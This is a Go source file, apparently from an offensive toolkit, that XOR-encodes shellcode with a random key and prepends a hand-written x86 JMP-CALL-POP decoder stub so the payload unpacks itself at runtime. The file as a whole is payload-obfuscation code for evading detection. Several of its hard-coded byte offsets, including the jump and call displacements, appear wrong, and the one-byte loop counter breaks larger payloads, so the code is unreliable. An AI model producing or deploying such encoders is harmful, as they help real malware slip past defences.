package core

import (
	"crypto/rand"
	"fmt"
)

// GenerateRandomBytes generates a slice of cryptographically secure random bytes
func GenerateRandomBytes(n int) []byte {
	b := make([]byte, n)
	_, err := rand.Read(b)
	if err != nil {
		// Fallback to simple values if crypto rand fails (rare)
		for i := range b {
			b[i] = byte(i % 255)
		}
	}
	return b
}

// XOREncode takes raw shellcode, generates a random 4-byte key,
// XOR encodes the shellcode, and prepends an x86 decoder stub.
func XOREncode(shellcode []byte) ([]byte, error) {
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("shellcode is empty")
	}

	// Generate 4-byte random XOR key
	key := GenerateRandomBytes(4)
	
	// Pad shellcode to be a multiple of 4 bytes
	paddingLen := (4 - (len(shellcode) % 4)) % 4
	paddedShellcode := make([]byte, len(shellcode)+paddingLen)
	copy(paddedShellcode, shellcode)
	
	// Add NOP padding
	for i := len(shellcode); i < len(paddedShellcode); i++ {
		paddedShellcode[i] = 0x90
	}

	// Encode payload
	encoded := make([]byte, len(paddedShellcode))
	for i := 0; i < len(paddedShellcode); i += 4 {
		encoded[i] = paddedShellcode[i] ^ key[0]
		encoded[i+1] = paddedShellcode[i+1] ^ key[1]
		encoded[i+2] = paddedShellcode[i+2] ^ key[2]
		encoded[i+3] = paddedShellcode[i+3] ^ key[3]
	}

	// Calculate loop count (number of 4-byte blocks)
	loopCount := len(encoded) / 4

	// Let's rewrite the decoder stub correctly to avoid null bytes if possible
	// GetPC: JMP-CALL-POP
	/*
		jmp short get_payload
	decoder:
		pop esi           ; ESI points to EncodedData
		push esi          ; Save for later execution
		xor ecx, ecx
		mov cl, [loop_count]
		mov eax, [key]
	decode_loop:
		xor dword ptr [esi], eax
		add esi, 4
		loop decode_loop
		ret               ; jumps to the decrypted payload we pushed earlier
	get_payload:
		call decoder
	EncodedData:
	*/
	
	jmpCallPopDecoder := []byte{
		0xeb, 0x11,             // jmp short 0x11 (to get_payload)
		// decoder:
		0x5e,                   // pop esi
		0x56,                   // push esi
		0x31, 0xc9,             // xor ecx, ecx
		0xb1, byte(loopCount),  // mov cl, loopCount
		0xb8, key[0], key[1], key[2], key[3], // mov eax, KEY
		// decode_loop:
		0x31, 0x06,             // xor [esi], eax
		0x83, 0xc6, 0x04,       // add esi, 4
		0xe2, 0xf9,             // loop decode_loop (-7)
		0xc3,                   // ret
		// get_payload:
		0xe8, 0xea, 0xff, 0xff, 0xff, // call decoder (-0x16)
	}

	// Combine decoder stub + encoded payload
	finalPayload := append(jmpCallPopDecoder, encoded...)

	return finalPayload, nil
}
